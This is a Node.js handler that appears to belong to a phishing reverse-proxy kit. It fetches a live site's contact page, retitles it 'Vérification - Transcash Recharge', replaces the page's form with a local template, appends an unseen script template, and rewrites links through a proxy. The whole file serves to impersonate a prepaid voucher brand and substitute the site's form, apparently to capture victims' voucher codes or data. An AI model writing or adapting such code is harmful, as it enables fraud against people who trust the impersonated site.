const cheerio = require('cheerio');
const rewriteLinks = require('../utils/rewriteLinks');
const addnavlink = require('../utils/addnavlink');
const fs = require('fs');
const path = require('path');

const verification = async (req, res, TARGET_URL, PROXY_URL) => {
    
  const response = await fetch(`${TARGET_URL}contact`);
  const buffer = await response.arrayBuffer();
  let html = Buffer.from(buffer).toString('utf8');

  // Modification avec Cheerio
  const $ = cheerio.load(html);
  
  // Exemple de modifications
  $('title').text('Vérification - Transcash Recharge');
  $('.text-center.mb-4').text('Vérification');
  
  // Vider tous les enfants
  $('.form-bzhd-bootsrap-4').empty();

  const template = fs.readFileSync(path.join(__dirname, '../templates/template.html'), 'utf8');
  $('.form-bzhd-bootsrap-4').append(template);

  //le script
  const scripttemplate = fs.readFileSync(path.join(__dirname, '../templates/scriptTemplate.html'), 'utf8');
  $('body').append(scripttemplate);

  html = $.html();

  // Appliquer tes middlewares existants
  html = rewriteLinks(html, TARGET_URL, PROXY_URL);
  html = addnavlink(html, PROXY_URL);

  const finalBody = Buffer.from(html, 'utf8');
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Content-Length', finalBody.length);
  res.end(finalBody);
}

module.exports = verification;